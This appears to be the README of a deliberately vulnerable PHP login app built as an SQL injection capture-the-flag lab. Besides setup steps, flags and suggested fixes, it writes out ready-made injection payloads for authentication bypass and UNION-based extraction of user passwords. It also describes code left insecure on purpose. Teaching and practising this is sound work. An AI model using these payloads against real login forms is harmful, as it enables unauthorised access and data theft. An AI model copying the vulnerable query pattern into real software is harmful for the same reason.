# SQL Injection CTF Challenge

A deliberately vulnerable login system designed for learning SQL injection techniques in a safe environment. This CTF challenge simulates a corporate employee portal with intentionally vulnerable authentication.

## Prerequisites

- **Windows**: XAMPP (recommended) or individual Apache/MySQL/PHP installation
- **Linux/Mac**: XAMPP, LAMP stack, or individual components
- PHP 7.4+ with PDO MySQL extension
- MySQL/MariaDB server
- Web server (Apache/Nginx) or PHP built-in server

## Quick Setup

### Option 1: XAMPP Setup (Windows - Recommended)

#### 1. Install XAMPP
1. Download XAMPP from: https://www.apachefriends.org/download.html
2. Run the installer as Administrator
3. Select components: Apache, MySQL, PHP, phpMyAdmin
4. Complete installation (default: `C:\xampp`)

#### 2. Start XAMPP Services
1. Open XAMPP Control Panel as Administrator
2. Click "Start" next to **Apache**
3. Click "Start" next to **MySQL**
4. Verify both services show green status

#### 3. Deploy Application Files
1. Navigate to: `C:\xampp\htdocs\`
2. Create folder: `ctf-sql`
3. Copy all project files to `C:\xampp\htdocs\ctf-sql\`:
   - `index.html`
   - `login.php`
   - `db.php`
   - `style.css`
   - `setup.sql`

#### 4. Set Up Database
1. Open phpMyAdmin: `http://localhost/phpmyadmin`
2. Click "New" → Enter database name: `ctf_sql` → Click "Create"
3. Select `ctf_sql` database → Click "Import" tab
4. Choose `setup.sql` file → Click "Go"

#### 5. Configure Database Connection
Edit `C:\xampp\htdocs\ctf-sqli\db.php`:
```php
$host = 'localhost';
$dbname = 'ctf_sql';
$username = 'root';
$password = ''; // XAMPP MySQL has no password by default
```

#### 6. Access the Application
Open browser and navigate to: `http://localhost/ctf-sqli/`

### Option 2: Manual Setup (Advanced Users)

#### 1. Database Setup
```bash
# Connect to MySQL as root
mysql -u root -p

# Run the setup script
source setup.sql
```

#### 2. Configure Database Connection
The application uses environment variables for database configuration. You can either:

**Option A: Set Environment Variables**
```bash
export DB_HOST=localhost
export DB_NAME=ctf_sql
export DB_USER=root
export DB_PASS=your_password
```

**Option B: Edit db.php directly**
```php
$host = 'localhost';
$dbname = 'ctf_sql';
$username = 'root';
$password = 'your_password';
```

#### 3. Start the Web Server
```bash
# Using PHP built-in server
php -S localhost:8000

# Or configure your web server to serve the ctf-sqli directory
```

#### 4. Access the Application
Open your browser and navigate to: `http://localhost:8000`

## CTF Challenge

### Objective
Bypass the login authentication using SQL injection to retrieve the hidden CTF flags from the SecureCorp employee portal.

### Available Users (Legitimate Credentials)
- Username: `admin`, Password: `admin`
- Username: `user1`, Password: `password123`
- Username: `test`, Password: `vader`
- Username: `guest`, Password: `DontHackME`
- Username: `superadmin`, Password: `potato` (hidden user)

## SQL Injection Examples

### Basic Authentication Bypass
```
Username: admin' --
Password: anything
```

### Union-Based Injection
```
Username: ' UNION SELECT 1,2,3,4,5 -- 
Password: anything
```

### Boolean-Based Injection
```
Username: admin' AND 1=1 --
Password: anything
```

### Error-Based Injection
```
Username: ' OR 1=1 --
Password: anything
```

### Advanced Techniques

#### Get All Users
```
Username: ' OR 1=1 ORDER BY id --
Password: anything
```

#### Get Specific User Data
```
Username: ' UNION SELECT id,username,password,flag,created_at FROM users WHERE username='admin' --
Password: anything
```

#### Database Information
```
Username: ' UNION SELECT 1,2,3,4,@@version --
Password: anything
```

## CTF Flags

The application contains multiple flags to discover:

1. **flag{sql_injection_master}** - Admin user flag
2. **flag{user_level_access_granted}** - User1 flag
3. **FLAG{TEST_ACCOUNT_COMPROMISED}** - Test user flag
4. **FLAG{GUEST_PRIVILEGES_ESCALATED}** - Guest user flag
5. **FLAG{SUPER_ADMIN_ACCESS_ACHIEVED}** - Hidden superadmin flag

## Security Notes

**IMPORTANT**: This application is intentionally vulnerable for educational purposes only. Never deploy this code in a production environment!

### Vulnerabilities Included:
- No input sanitization
- Direct string concatenation in SQL queries
- No prepared statements
- Error messages exposed
- No password hashing
- SQL injection in login form

### How to Fix (For Learning):
1. Use prepared statements
2. Implement input validation
3. Hash passwords
4. Hide error messages
5. Use parameterized queries

## File Structure

```
ctf-sql/
├── index.html          # Login form (SecureCorp employee portal)
├── style.css           # Styling for the application
├── login.php           # Vulnerable login handler
├── db.php              # Database connection configuration
├── setup.sql           # Database schema and test data
├── .gitignore          # Git ignore rules
└── README.md           # This file
```

## Learning Objectives

1. Understand SQL injection vulnerabilities
2. Learn common injection techniques
3. Practice manual SQL injection
4. Understand the importance of input validation
5. Learn secure coding practices
6. Experience real-world application security testing

## Troubleshooting

### XAMPP-Specific Issues:

1. **Apache Won't Start**
   - Check if port 80 is in use (IIS, Skype, etc.)
   - Change Apache port in `C:\xampp\apache\conf\httpd.conf`
   - Run XAMPP Control Panel as Administrator

2. **MySQL Won't Start**
   - Check if MySQL service is already running
   - Verify no other MySQL instances are active
   - Check XAMPP error logs in `C:\xampp\mysql\data\`

3. **Database Connection Failed**
   - Verify MySQL is running in XAMPP Control Panel
   - Check database name is `ctf_sql`
   - Ensure `setup.sql` was imported successfully
   - Verify credentials in `db.php`

4. **Page Not Found (404)**
   - Confirm files are in `C:\xampp\htdocs\ctf-sqli\`
   - Check Apache is running
   - Try accessing `http://localhost/` first

### General Issues:

1. **Permission Denied**
   - Check file permissions
   - Ensure web server can read files
   - Run XAMPP as Administrator

2. **PDO Extension Missing**
   - Verify PDO MySQL extension is enabled in `php.ini`
   - Restart Apache after configuration changes

3. **Environment Variables Not Working**
   - Check if your web server supports environment variables
   - Fall back to editing `db.php` directly

## Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PHP Security Best Practices](https://www.php.net/manual/en/security.php)
- [XAMPP Documentation](https://www.apachefriends.org/docs.html)

NOTE: README made by AI